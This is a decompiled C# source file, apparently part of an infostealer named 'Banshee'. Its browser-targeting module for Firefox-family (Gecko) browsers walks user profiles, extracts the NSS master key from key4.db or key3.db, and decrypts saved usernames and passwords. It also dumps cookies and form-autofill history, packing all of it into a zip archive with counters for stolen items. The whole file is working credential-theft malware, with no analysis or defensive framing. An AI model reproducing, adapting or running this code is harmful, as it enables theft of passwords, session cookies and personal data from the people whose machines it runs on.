﻿using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Banshee.Helper;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;
using Banshee.Helper.Sql;

namespace Banshee.Targets.Browsers
{
	// Token: 0x02000086 RID: 134
	public class Gecko : ITarget
	{
		// Token: 0x06000190 RID: 400 RVA: 0x0000D2A0 File Offset: 0x0000D2A0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Gecko, delegate(string browser)
			{
				if (!Directory.Exists(browser))
				{
					return;
				}
				if (Gecko.IsGeckoProfile(browser))
				{
					DirectoryInfo parent = Directory.GetParent(browser);
					string text = (parent != null) ? parent.FullName : null;
					if (!string.IsNullOrEmpty(text))
					{
						this.ProfileCollect(zip, counter, text, browser);
					}
					return;
				}
				string[] source;
				try
				{
					source = Directory.GetDirectories(browser);
				}
				catch
				{
					source = Array.Empty<string>();
				}
				Parallel.ForEach<string>(source, delegate(string profile)
				{
					this.ProfileCollect(zip, counter, browser, profile);
				});
			});
		}

		// Token: 0x06000191 RID: 401 RVA: 0x0000D2E0 File Offset: 0x0000D2E0
		private static bool IsGeckoProfile(string path)
		{
			return Directory.Exists(path) && (File.Exists(Path.Combine(path, "logins.json")) || File.Exists(Path.Combine(path, "key4.db")) || (File.Exists(Path.Combine(path, "key3.db")) || File.Exists(Path.Combine(path, "cookies.sqlite"))) || File.Exists(Path.Combine(path, "formhistory.sqlite")));
		}

		// Token: 0x06000192 RID: 402 RVA: 0x0000D354 File Offset: 0x0000D354
		private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
		{
			browser + "\\Local State";
			string browsername = Paths.GetBrowserName(browser);
			string profilename = Path.GetFileName(profile);
			Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
			counterBrowser.Profile = profile;
			counterBrowser.BrowserName = browsername;
			Task.WaitAll(new Task[]
			{
				Task.Run(delegate()
				{
					this.Password(zip, counter, counterBrowser, profile, profilename, browsername);
				}),
				Task.Run(delegate()
				{
					this.Cookies(zip, counter, counterBrowser, profile, profilename, browsername);
				}),
				Task.Run(delegate()
				{
					this.AutoFill(zip, counterBrowser, profile, profilename, browsername);
				})
			});
			if (counterBrowser.Cookies != 0L || counterBrowser.Password != 0L || counterBrowser.CreditCards != 0L || counterBrowser.AutoFill != 0L || counterBrowser.RestoreToken != 0L || counterBrowser.MaskCreditCard != 0L || counterBrowser.MaskedIban != 0L)
			{
				counter.Browsers.Add(counterBrowser);
			}
		}

		// Token: 0x06000193 RID: 403 RVA: 0x0000D4B8 File Offset: 0x0000D4B8
		private void Password(InMemoryZip zip, Counter counter, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string text = Path.Combine(profile, "logins.json");
			if (!File.Exists(text))
			{
				return;
			}
			string text2 = Path.Combine(profile, "key4.db");
			string text3 = Path.Combine(profile, "key3.db");
			byte[] masterKey = null;
			if (File.Exists(text2))
			{
				masterKey = NssDumpMasterKey.Key4Database(text2);
			}
			else if (File.Exists(text3))
			{
				masterKey = NssDumpMasterKey.Key3Database(text3);
			}
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Reading Gecko logins from '",
				text,
				"' with key sources '",
				text2,
				"' and '",
				text3,
				"'"
			}));
			if (masterKey == null && !NSSDecryptor.Initialize(profile))
			{
				return;
			}
			string text4 = File.ReadAllText(text);
			if (string.IsNullOrEmpty(text4))
			{
				return;
			}
			MatchCollection matchCollection = Regex.Matches(text4, "\"hostname\":\\s*\"(.*?)\".*?\"encryptedUsername\":\\s*\"(.*?)\".*?\"encryptedPassword\":\\s*\"(.*?)\"", RegexOptions.Singleline);
			if (matchCollection.Count == 0)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			long y = counterBrowser.Password;
			Parallel.ForEach<Match>(matchCollection.Cast<Match>(), delegate(Match match)
			{
				string value = match.Groups[1].Value;
				string value2 = match.Groups[2].Value;
				string value3 = match.Groups[3].Value;
				string text5;
				string text6;
				if (masterKey == null)
				{
					text5 = NSSDecryptor.Decrypt(value2);
					text6 = NSSDecryptor.Decrypt(value3);
				}
				else
				{
					Asn1Der asn1Der = new Asn1Der();
					byte[] toParse = Convert.FromBase64String(value2);
					byte[] toParse2 = Convert.FromBase64String(value3);
					Asn1DerObject asn1DerObject = asn1Der.Parse(toParse);
					Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse2);
					byte[] data = asn1DerObject.Objects[0].Objects[1].Objects[1].Data;
					byte[] data2 = asn1DerObject.Objects[0].Objects[1].Objects[0].Data;
					byte[] data3 = asn1DerObject2.Objects[0].Objects[1].Objects[1].Data;
					byte[] data4 = asn1DerObject2.Objects[0].Objects[1].Objects[0].Data;
					text5 = TripleDes.DecryptStringDesCbc(masterKey, data, data2);
					text6 = TripleDes.DecryptStringDesCbc(masterKey, data3, data4);
				}
				text5 = (string.IsNullOrEmpty(text5) ? "" : Regex.Replace(text5, "[^\\u0020-\\u007F]", ""));
				text6 = (string.IsNullOrEmpty(text6) ? "" : Regex.Replace(text6, "[^\\u0020-\\u007F]", ""));
				if (!BrowserDataFilter.ShouldExclude(value) && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(text5) && !string.IsNullOrEmpty(text6))
				{
					lines.Add(string.Concat(new string[]
					{
						"Hostname: ",
						value,
						"\nUsername: ",
						text5,
						"\nPassword: ",
						text6,
						"\n\n"
					}));
					Counter.CounterBrowser counterBrowser2 = counterBrowser;
					counterBrowser2.Password = ++counterBrowser2.Password;
					counter.AddBrutePassword(text6);
					counter.TrackPasswordDomain(value);
				}
			});
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Processed '",
				text,
				"' -> ",
				(counterBrowser.Password - y > 0L) ? string.Format("collected {0} passwords", counterBrowser.Password - y) : "no passwords found"
			}));
			zip.AddTextFile(string.Concat(new string[]
			{
				"Passwords\\Passwords_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Join("", lines.ToList<string>()));
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000D6D4 File Offset: 0x0000D6D4
		private void Cookies(InMemoryZip zip, Counter counter, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string text = Path.Combine(profile, "cookies.sqlite");
			if (!File.Exists(text))
			{
				return;
			}
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Reading Gecko cookies from '",
				text,
				"'"
			}));
			SqLite sSqLite = SqLite.ReadTable(text, "moz_cookies");
			if (sSqLite == null)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			long y = counterBrowser.Cookies;
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 3);
					string value2 = sSqLite.GetValue(i, 4);
					string value3 = sSqLite.GetValue(i, 2);
					string value4 = sSqLite.GetValue(i, 5);
					string value5 = sSqLite.GetValue(i, 6);
					if (!BrowserDataFilter.ShouldExclude(value2) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3) && !string.IsNullOrEmpty(value4) && !string.IsNullOrEmpty(value5))
					{
						counter.TrackCookieDomain(value2, value4);
						string item = string.Concat(new string[]
						{
							value2,
							"\tTRUE\t",
							value4,
							"\tFALSE\t",
							value5,
							"\t",
							value3,
							"\t",
							value,
							"\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.Cookies = ++counterBrowser2.Cookies;
					}
				}
				catch
				{
				}
			});
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Processed '",
				text,
				"' -> ",
				(counterBrowser.Cookies - y > 0L) ? string.Format("collected {0} cookies", counterBrowser.Cookies - y) : "no cookies found"
			}));
			zip.AddTextFile(string.Concat(new string[]
			{
				"Cookies\\Cookies_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Join("", lines.ToList<string>()));
		}

		// Token: 0x06000195 RID: 405 RVA: 0x0000D868 File Offset: 0x0000D868
		private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, string profile, string profilename, string browsername)
		{
			string text = Path.Combine(profile, "formhistory.sqlite");
			if (!File.Exists(text))
			{
				return;
			}
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Reading Gecko autofill entries from '",
				text,
				"'"
			}));
			SqLite sSqLite = SqLite.ReadTable(text, "moz_formhistory");
			if (sSqLite == null)
			{
				return;
			}
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			long y = counterBrowser.AutoFill;
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 1);
					string value2 = sSqLite.GetValue(i, 2);
					if (!string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value))
					{
						string item = string.Concat(new string[]
						{
							"Name: ",
							value,
							"\nValue: ",
							value2,
							"\n\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.AutoFill = ++counterBrowser2.AutoFill;
					}
				}
				catch
				{
				}
			});
			DebugLogger.Log(string.Concat(new string[]
			{
				"[",
				browsername,
				":",
				profilename,
				"] Processed '",
				text,
				"' -> ",
				(counterBrowser.AutoFill - y > 0L) ? string.Format("collected {0} autofills", counterBrowser.AutoFill - y) : "no autofills found"
			}));
			zip.AddTextFile(string.Concat(new string[]
			{
				"AutoFills\\AutoFill_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Join("", lines.ToList<string>()));
		}
	}
}
